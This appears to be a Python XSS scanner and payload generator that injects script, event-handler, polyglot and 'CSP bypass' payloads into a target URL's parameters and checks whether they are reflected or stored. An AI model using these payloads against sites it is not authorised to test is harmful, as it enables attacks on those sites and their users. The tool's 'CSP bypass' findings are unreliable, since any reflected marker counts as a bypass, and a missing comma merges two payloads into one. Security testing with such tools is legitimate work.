#!/usr/bin/env python3
"""
WEB2 — XSS Scanner + Payload Generator
Reflected, Stored, and DOM-based XSS detection with CSP bypass payloads.
"""

import argparse
import sys
import time
import random
import string
import re
import json
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class XSSType(Enum):
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"


@dataclass
class ScanResult:
    url: str
    parameter: str
    xss_type: XSSType
    payload: str
    context: str
    evidence: str = ""
    csp_bypass: bool = False


@dataclass
class ScanConfig:
    url: str
    method: str = "GET"
    data: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    timeout: int = 10
    delay: float = 0.0
    level: int = 1
    encode: str = "none"
    verbose: bool = False
    test_stored: bool = False
    check_csp: bool = False


MARKER = "xSs" + "".join(random.choices(string.ascii_uppercase, k=6))
MARKER_RE = re.compile(re.escape(MARKER), re.IGNORECASE)

XSS_PAYLOADS = {
    "basic": [
        f"<script>alert('{MARKER}')</script>",
        f"<script>alert(document.cookie)</script>",
        f"<img src=x onerror=alert('{MARKER}')>",
        f"<svg onload=alert('{MARKER}')>",
        f"<body onload=alert('{MARKER}')>",
        f"<iframe src=\"javascript:alert('{MARKER}')\">",
    ],
    "event_handler": [
        f"\" onmouseover=\"alert('{MARKER}')\"",
        f"' onmouseover='alert(\"{MARKER}\")' ",
        f"\" onfocus=\"alert('{MARKER}')\" autofocus=\"",
        f"\" onmouseover=alert('{MARKER}')\"",
        f"' onfocus=alert('{MARKER}') autofocus='",
        f"\" onclick=\"alert('{MARKER}')\"",
        f"' onclick='alert(\"{MARKER}\")' ",
        f"\" onerror=\"alert('{MARKER}')\"",
    ],
    "attribute_breakout": [
        f"\"><script>alert('{MARKER}')</script>",
        f"'><script>alert('{MARKER}')</script>",
        f"\"><img src=x onerror=alert('{MARKER}')>",
        f"'><img src=x onerror=alert('{MARKER}')>",
        f"\"></script><script>alert('{MARKER}')</script>",
        f"'><svg onload=alert('{MARKER}')>",
    ],
    "javascript_protocol": [
        f"javascript:alert('{MARKER}')",
        f"javascript:alert(document.cookie)",
        f"data:text/html,<script>alert('{MARKER}')</script>",
        f"vbscript:MsgBox('{MARKER}')",
    ],
    "html_injection": [
        f"<h1>{MARKER}</h1>",
        f"<div style=\"background:red\">{MARKER}</div>",
        f"<marquee>{MARKER}</marquee>",
        f"<details open ontoggle=alert('{MARKER}')>",
    ],
    "polyglot": [
        f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('{MARKER}'))//",
        f"<img src=1 onerror=alert('{MARKER}')>",
        f"\\\"><svg/onload=alert('{MARKER}')\">",
        f"{{constructor.constructor('alert(1)')()}}",
    ],
}

DOM_XSS_SOURCES = [
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "location.href",
    "location.search",
    "location.hash",
    "window.name",
    "document.cookie",
    "postMessage",
]

DOM_XSS_SINKS = [
    "eval(",
    "setTimeout(",
    "setInterval(",
    "document.write(",
    "document.writeln(",
    ".innerHTML",
    ".outerHTML",
    "document.location",
    "window.location",
    ".src=",
    "jQuery.html(",
    "$.html(",
    ".insertAdjacentHTML(",
    ".insertAdjacentText(",
    "document.domain",
    "element.setAttribute(",
    "window.open(",
]

CSP_BYPASS_PAYLOADS = [
    f"<script>alert('{MARKER}')</script>",
    f"<img src=x onerror=alert('{MARKER}')>",
    f"<svg/onload=alert('{MARKER}')>",
    f"<details open ontoggle=alert('{MARKER}')>",
    f"<body onload=alert('{MARKER}')>",
    f"<iframe src=\"data:text/html,<script>alert('{MARKER}')</script>\">",
    f"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{MARKER}')\">",
    f"<a href=\"javascript:alert('{MARKER}')\">click</a>",
    f"<form id=\"xss\" action=\"javascript:alert('{MARKER}')\"><button>Click</button></form>"
    f"<object data=\"javascript:alert('{MARKER}')\">",
    f"<embed src=\"javascript:alert('{MARKER}')\">",
    f"<video><source onerror=alert('{MARKER}')>",
    f"<audio src=x onerror=alert('{MARKER}')>",
    f"<input onfocus=alert('{MARKER}') autofocus>",
    f"<select autofocus onfocus=alert('{MARKER}')>",
    f"<textarea autofocus onfocus=alert('{MARKER}')>",
    f"<keygen autofocus onfocus=alert('{MARKER}')>",
    f"<marquee onstart=alert('{MARKER}')>",
    f"<island-ssr-headless><template shadowrootmode=\"open\"><script>alert('{MARKER}')</script></template></island-ssr-headless>",
    f"<xss tabindex=1 onfocus=alert('{MARKER}') autofocus>",
    f"<math><mtext><table><mglyph><style><img src=x onerror=alert('{MARKER}')>",
]

HTML_CONTEXT_PAYLOADS = [
    f"<script>alert('{MARKER}')</script>",
    f"<img src=x onerror=alert('{MARKER}')>",
    f"<svg onload=alert('{MARKER}')>",
    f"<body onload=alert('{MARKER}')>",
    f"<iframe src=\"javascript:alert('{MARKER}')\">",
    f"<video><source onerror=alert('{MARKER}')>",
    f"<audio src=x onerror=alert('{MARKER}')>",
    f"<input onfocus=alert('{MARKER}') autofocus>",
    f"<details open ontoggle=alert('{MARKER}')>",
]

JS_CONTEXT_PAYLOADS = [
    f"';alert('{MARKER}');//",
    f"\";alert('{MARKER}');//",
    f"\\';alert('{MARKER}');//",
    f"\\\";alert('{MARKER}');//",
    f"</script><script>alert('{MARKER}')</script>",
    f"{{alert('{MARKER}')}}",
    f"\\x3cscript\\x3ealert('{MARKER}')\\x3c/script\\x3e",
]

ATTR_CONTEXT_PAYLOADS = [
    f"\" onmouseover=\"alert('{MARKER}')\"",
    f"' onmouseover='alert(\"{MARKER}\")' ",
    f"\" onfocus=\"alert('{MARKER}')\" autofocus=\"",
    f"\" onclick=\"alert('{MARKER}')\"",
    f"' onfocus=alert('{MARKER}') autofocus='",
]

URL_CONTEXT_PAYLOADS = [
    f"javascript:alert('{MARKER}')",
    f"data:text/html,<script>alert('{MARKER}')</script>",
    f"javascript:void(alert('{MARKER}'))",
]


def print_banner():
    banner = r"""
  ╔══════════════════════════════════════════════╗
  ║    WEB2 — XSS Scanner + Payload Generator   ║
  ║       Reflected / Stored / DOM XSS           ║
  ╚══════════════════════════════════════════════╝
"""
    print(banner)


def encode_payload(payload: str, encoding: str) -> str:
    if encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == "html":
        return ''.join(f"&#{ord(c)};" for c in payload)
    elif encoding == "unicode":
        return ''.join(f"\\u{ord(c):04x}" for c in payload)
    elif encoding == "base64":
        import base64
        return base64.b64encode(payload.encode()).decode()
    return payload


class XSSScanner:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.session = requests.Session() if HAS_REQUESTS else None
        self.results: list[ScanResult] = []
        self.csp_headers: dict = {}
        if self.session:
            self.session.headers.update(config.headers)
            self.session.cookies.update(config.cookies)

    def _request(self, url: str, method: str = "GET", data: dict = None) -> tuple[str, dict, float]:
        start = time.time()
        try:
            if method.upper() == "POST":
                resp = self.session.post(url, data=data, timeout=self.config.timeout)
            else:
                resp = self.session.get(url, timeout=self.config.timeout)
            elapsed = time.time() - start
            return resp.text, dict(resp.headers), elapsed
        except requests.exceptions.Timeout:
            return "", {}, time.time() - start
        except Exception as e:
            if self.config.verbose:
                print(f"  [!] Request error: {e}")
            return "", {}, time.time() - start

    def _build_url(self, base_url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _build_data(self, param: str, value: str) -> dict:
        data = dict(self.config.data)
        data[param] = value
        return data

    def check_csp(self, headers: dict) -> dict:
        csp = {}
        csp_header = headers.get("content-security-policy", "")
        if csp_header:
            csp["raw"] = csp_header
            csp["directives"] = {}
            for directive in csp_header.split(";"):
                directive = directive.strip()
                if " " in directive:
                    parts = directive.split()
                    csp["directives"][parts[0]] = parts[1:]
                elif directive:
                    csp["directives"][directive] = []

            csp["allows_inline"] = "'unsafe-inline'" in csp_header
            csp["allows_eval"] = "'unsafe-eval'" in csp_header
            csp["allows_data"] = "data:" in csp_header
            csp["has_report_only"] = "report-uri" in csp_header or "report-to" in csp_header

            script_src = csp["directives"].get("script-src", [])
            csp["script_src_wildcard"] = "*" in script_src
        return csp

    def detect_parameters(self) -> list[str]:
        parsed = urllib.parse.urlparse(self.config.url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            return list(params.keys())
        if self.config.data:
            return list(self.config.data.keys())
        return ["q", "search", "input", "name", "comment"]

    def detect_context(self, response_text: str, marker: str) -> str:
        if re.search(r"<script[^>]*>.*?" + re.escape(marker), response_text, re.DOTALL | re.IGNORECASE):
            return "javascript"
        if re.search(r"<" + re.escape(marker) + r"[^>]*>", response_text, re.IGNORECASE):
            return "html"
        if re.search(r"attribute[^>]*" + re.escape(marker), response_text, re.IGNORECASE):
            return "attribute"
        if re.search(r"url[^>]*" + re.escape(marker), response_text, re.IGNORECASE):
            return "url"
        if re.search(r"comment[^>]*" + re.escape(marker), response_text, re.IGNORECASE):
            return "comment"
        if re.search(re.escape(marker), response_text):
            return "html"
        return "unknown"

    def test_reflected(self, url: str, param: str) -> list[ScanResult]:
        results = []
        all_payloads = []
        all_payloads.extend(XSS_PAYLOADS["basic"])
        all_payloads.extend(XSS_PAYLOADS["event_handler"])
        all_payloads.extend(XSS_PAYLOADS["attribute_breakout"])

        for payload in all_payloads:
            encoded = encode_payload(payload, self.config.encode)
            if self.config.method.upper() == "POST":
                data = self._build_data(param, encoded)
                response_text, headers, elapsed = self._request(url, "POST", data)
            else:
                test_url = self._build_url(url, param, encoded)
                response_text, headers, elapsed = self._request(test_url)

            if MARKER_RE.search(response_text):
                context = self.detect_context(response_text, MARKER)
                csp_bypass = False

                if self.config.check_csp:
                    csp = self.check_csp(headers)
                    if csp:
                        if csp.get("allows_inline") or csp.get("script_src_wildcard"):
                            csp_bypass = True

                results.append(ScanResult(
                    url=url, parameter=param, xss_type=XSSType.REFLECTED,
                    payload=payload, context=context,
                    evidence=f"Marker reflected in {context} context",
                    csp_bypass=csp_bypass,
                ))

                if self.config.verbose:
                    print(f"  [+] Reflected XSS: param={param}, context={context}")
                    print(f"      Payload: {payload[:60]}")

                if not self.config.verbose:
                    break

            if self.config.delay > 0:
                time.sleep(self.config.delay)

        return results

    def test_stored(self, url: str, param: str) -> list[ScanResult]:
        results = []
        marker_payload = f"<script>alert('{MARKER}')</script>"

        if self.config.verbose:
            print(f"  [*] Testing stored XSS on param={param}")

        if self.config.method.upper() == "POST":
            data = self._build_data(param, marker_payload)
            self._request(url, "POST", data)
        else:
            test_url = self._build_url(url, param, marker_payload)
            self._request(test_url)

        time.sleep(1)

        response_text, headers, _ = self._request(url)
        if MARKER_RE.search(response_text):
            results.append(ScanResult(
                url=url, parameter=param, xss_type=XSSType.STORED,
                payload=marker_payload, context="html",
                evidence="Payload persisted and reflected in response",
            ))
            if self.config.verbose:
                print(f"  [+] Stored XSS found: param={param}")

        return results

    def analyze_dom(self, url: str) -> list[ScanResult]:
        results = []
        response_text, _, _ = self._request(url)

        if not response_text:
            return results

        found_sources = []
        found_sinks = []

        for source in DOM_XSS_SOURCES:
            if source in response_text:
                found_sources.append(source)

        for sink in DOM_XSS_SINKS:
            if sink in response_text:
                found_sinks.append(sink)

        if found_sources and found_sinks:
            evidence = f"Sources: {', '.join(found_sources[:3])} | Sinks: {', '.join(found_sinks[:3])}"
            results.append(ScanResult(
                url=url, parameter="DOM", xss_type=XSSType.DOM_BASED,
                payload="N/A (DOM analysis)", context="dom",
                evidence=evidence,
            ))
            if self.config.verbose:
                print(f"  [+] Potential DOM XSS: {evidence}")

        return results

    def run_scan(self):
        if not HAS_REQUESTS:
            print("[!] Error: 'requests' library required. Install with: pip install requests")
            sys.exit(1)

        print(f"[*] Target: {self.config.url}")
        print(f"[*] Method: {self.config.method}")
        print(f"[*] Marker: {MARKER}")
        print()

        if self.config.check_csp:
            print("[*] Checking CSP headers...")
            _, headers, _ = self._request(self.config.url)
            csp = self.check_csp(headers)
            if csp:
                print(f"    CSP detected: {csp.get('raw', 'N/A')[:100]}")
                print(f"    Inline allowed: {csp.get('allows_inline', False)}")
                print(f"    Eval allowed: {csp.get('allows_eval', False)}")
            else:
                print("    No CSP headers detected")
            print()

        parameters = self.detect_parameters()
        print(f"[*] Parameters to test: {parameters}")
        print()

        for param in parameters:
            print(f"[*] Testing parameter: {param}")

            print(f"[*] Testing reflected XSS...")
            results = self.test_reflected(self.config.url, param)
            self.results.extend(results)

            if self.config.test_stored:
                print(f"[*] Testing stored XSS...")
                results = self.test_stored(self.config.url, param)
                self.results.extend(results)

        if self.config.level >= 2:
            print(f"[*] Analyzing DOM sources and sinks...")
            results = self.analyze_dom(self.config.url)
            self.results.extend(results)

        if self.config.check_csp and self.results:
            print(f"[*] Testing CSP bypass payloads...")
            for payload in CSP_BYPASS_PAYLOADS:
                encoded = encode_payload(payload, self.config.encode)
                if self.config.method.upper() == "POST":
                    data = self._build_data(list(self.config.data.keys())[0] if self.config.data else "q", encoded)
                    response_text, headers, _ = self._request(self.config.url, "POST", data)
                else:
                    test_url = self._build_url(self.config.url, list(urllib.parse.parse_qs(urllib.parse.urlparse(self.config.url).query).keys())[0] if urllib.parse.parse_qs(urllib.parse.urlparse(self.config.url).query) else "q", encoded)
                    response_text, headers, _ = self._request(test_url)

                if MARKER_RE.search(response_text):
                    self.results.append(ScanResult(
                        url=self.config.url, parameter="CSP_BYPASS",
                        xss_type=XSSType.REFLECTED, payload=payload,
                        context="csp_bypass",
                        evidence="Payload bypassed CSP", csp_bypass=True,
                    ))
                    if self.config.verbose:
                        print(f"  [+] CSP bypass found: {payload[:60]}")
                    break

    def print_results(self):
        print("\n" + "=" * 60)
        print("  SCAN RESULTS")
        print("=" * 60)

        if not self.results:
            print("\n  No XSS vulnerabilities found.\n")
            return

        by_type = {}
        for r in self.results:
            by_type.setdefault(r.xss_type.value, []).append(r)

        for xss_type, results in by_type.items():
            print(f"\n  --- {xss_type.upper()} XSS ({len(results)} found) ---")
            for i, r in enumerate(results, 1):
                print(f"  [{i}] Parameter: {r.parameter}")
                print(f"      Context:  {r.context}")
                print(f"      Payload:  {r.payload[:70]}")
                if r.evidence:
                    print(f"      Evidence: {r.evidence[:80]}")
                if r.csp_bypass:
                    print(f"      CSP Bypass: YES")

        print(f"\n  Total vulnerabilities: {len(self.results)}")
        print("=" * 60)

    def export_results(self, filename: str):
        data = []
        for r in self.results:
            data.append({
                "url": r.url,
                "parameter": r.parameter,
                "xss_type": r.xss_type.value,
                "payload": r.payload,
                "context": r.context,
                "evidence": r.evidence,
                "csp_bypass": r.csp_bypass,
            })
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[*] Results exported to {filename}")


def main():
    parser = argparse.ArgumentParser(
        description="WEB2 — XSS Scanner + Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://target.com/search?q=test"
  %(prog)s -u "http://target.com/comment" -m POST -d "text=hello"
  %(prog)s -u "http://target.com/page?q=test" --check-csp
  %(prog)s -u "http://target.com/page?q=test" --level 2 --stored
  %(prog)s -u "http://target.com/page?q=test" --encode url -o results.json
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL with parameter")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("-d", "--data", default="", help="POST data (key=value&key2=value2)")
    parser.add_argument("-c", "--cookies", default="", help="Cookies (key=value;key2=value2)")
    parser.add_argument("--header", action="append", default=[], help="Custom header (can repeat)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests")
    parser.add_argument("--level", type=int, default=1, choices=[1, 2, 3], help="Scan level (1-3)")
    parser.add_argument("--encode", choices=["none", "url", "double_url", "html", "unicode", "base64"], default="none", help="Payload encoding")
    parser.add_argument("--stored", action="store_true", help="Test for stored XSS")
    parser.add_argument("--check-csp", action="store_true", help="Analyze and test CSP bypass")
    parser.add_argument("-o", "--output", help="Export results to JSON file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    print_banner()

    data = {}
    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                data[k] = v

    cookies = {}
    if args.cookies:
        for pair in args.cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    config = ScanConfig(
        url=args.url,
        method=args.method,
        data=data,
        cookies=cookies,
        headers=headers,
        timeout=args.timeout,
        delay=args.delay,
        level=args.level,
        encode=args.encode,
        verbose=args.verbose,
        test_stored=args.stored,
        check_csp=args.check_csp,
    )

    scanner = XSSScanner(config)
    scanner.run_scan()
    scanner.print_results()

    if args.output:
        scanner.export_results(args.output)


if __name__ == "__main__":
    main()
